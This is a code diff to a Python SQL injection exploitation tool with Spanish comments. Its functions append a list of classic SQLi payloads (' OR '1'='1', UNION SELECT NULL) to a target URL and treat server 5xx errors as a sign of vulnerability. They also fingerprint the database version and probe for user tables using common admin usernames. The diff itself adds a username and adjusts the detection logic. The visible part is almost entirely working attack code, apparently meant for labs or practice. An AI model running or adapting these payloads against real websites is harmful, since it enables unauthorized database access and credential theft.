@@ -195,10 +195,9 @@ def exploit_database_version(url):
                     print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
             
                 else:
-                    print(f"[-] No match found for {db_type} using current payload.")
-                
-                # Añadir un delay para no sobrecargar el servidor
-                time.sleep(1)
+                    #print(f"[-] No match found for {db_type} using current payload.")
+                    # Añadir un delay para no sobrecargar el servidor
+                    time.sleep(1)
 
         print("[-] Could not detect the database type after exhausting all payloads.")
     
@@ -225,7 +224,7 @@ def exploit_sqli_users_table(url):
         - Handles SSL errors and other request-related exceptions.
     """
     
-    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
+    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin','user']
     possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']
 
     def try_payload(sql_payload):
@@ -296,15 +295,17 @@ def exploit_sqli(url):
         url (str): The target URL for the SQL injection test.
 
     Returns:
-        bool: True if a vulnerable URL is found, False otherwise.
+        bool: True if a vulnerable URL is found (based on HTTP 5xx errors), False otherwise.
 
     Description:
         - Iterates through a list of common SQL injection payloads.
         - Appends each payload to the target URL and sends an HTTP request.
-        - If the response contains an "Internal Server Error", the URL is likely vulnerable.
+        - If the response contains a status code in the 500-599 range, the URL is likely vulnerable.
         - Handles SSL and request-related errors.
         - Returns True if a vulnerable URL is identified, otherwise returns False.
     """
+    
+    # List of common SQL injection payloads
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
@@ -318,13 +319,16 @@ def exploit_sqli(url):
         "' UNION SELECT NULL, NULL --"
     ]
 
+    # Try each payload against the target URL
     for payload in payloads:
         target_url = url + payload
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
-            if "Internal Server Error" in r.text:
+            
+            if 500 <= r.status_code < 600:
                 print(f"[+] Vulnerable URL found with payload {payload}")
                 return True
+        
         except SSLError as e:
             print(f"[-] SSL Error en {target_url}: {e}")
             return False
